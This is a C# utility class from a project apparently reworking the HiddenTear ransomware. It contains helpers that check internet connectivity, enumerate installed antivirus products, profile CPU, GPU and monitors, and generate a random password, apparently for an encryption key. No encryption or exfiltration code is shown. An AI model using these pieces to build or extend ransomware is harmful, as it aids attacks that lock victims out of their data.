using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace hiddentearrecoded
{
    class Utils
    {
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        //https://ourcodeworld.com/articles/read/878/how-to-identify-detect-and-name-the-antivirus-software-installed-on-the-pc-with-c-on-winforms
        public static string GetAV()
        {
            try
            {
                string avlist = "";
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                        avlist += searchResult["displayName"].ToString();
                    if (avlist == "") return "Not installed";
                    return string.Join(", ", avlist);
                }
            }
            catch { }
            return "N/A";
        }

        //https://stackoverflow.com/questions/2708663/how-can-i-get-the-processor-name-of-my-machine-using-c-net-3-5
        public static string CPU()
        {
            string CPU = "";
            ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in mos.Get())
            {
                CPU += mo["Name"];
            }
            return CPU + " (" + Environment.ProcessorCount + " Cores)";
        }
    
        public static string[] GPUs()
        {
            int gpucount = 0;
            List<string> gpus = new List<string>();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
            foreach (ManagementObject mo in searcher.Get())
            {
                double gpumem = Convert.ToDouble(mo.Properties["AdapterRAM"].Value) / 1024 / 1024 / 1024;
                gpus.Add(Convert.ToString(mo.Properties["Name"].Value) + " - "  + gpumem + " GB");
                gpucount++;
            }
            return gpus.ToArray();
        }

        public static string[] Monitors()
        {
            List<string> monitors = new List<string>();
            foreach (Screen screen in Screen.AllScreens)
            {
                monitors.Add($"Name: {screen.DeviceName} Resolution: {screen.Bounds.Width}x{screen.Bounds.Height} Primary: {screen.Primary}");
            }
            return monitors.ToArray();
        }

        public static string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()";
            StringBuilder res = new StringBuilder();
            int randomInteger = CryptoRandom.RNGUtil.Next(0, valid.Length);
            while (0 < length--)
            {
                res.Append(valid[randomInteger]);
                randomInteger = CryptoRandom.RNGUtil.Next(0, valid.Length);
            }
            return res.ToString();
        }
    }
}
